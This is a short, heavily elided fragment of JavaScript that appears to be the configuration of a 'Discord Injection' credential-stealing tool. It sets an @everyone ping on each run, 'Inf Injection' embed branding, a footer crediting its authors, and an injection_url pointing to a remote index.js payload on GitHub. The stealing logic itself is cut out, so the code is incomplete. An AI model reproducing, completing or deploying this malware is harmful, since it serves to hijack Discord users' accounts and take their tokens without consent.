...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Inf Injection', 
  embed_icon: 'https://github-production-user-asset-6210df.s3.amazonaws.com/152412890/289637820-d64bf744-829f-48e5-846d-93d5a6468a36.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://github.com/12121212121QSDA/injection/blob/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By racss and clownhollow・https://github.com/12121212121QSDA',
        },
      },
    ],
  };
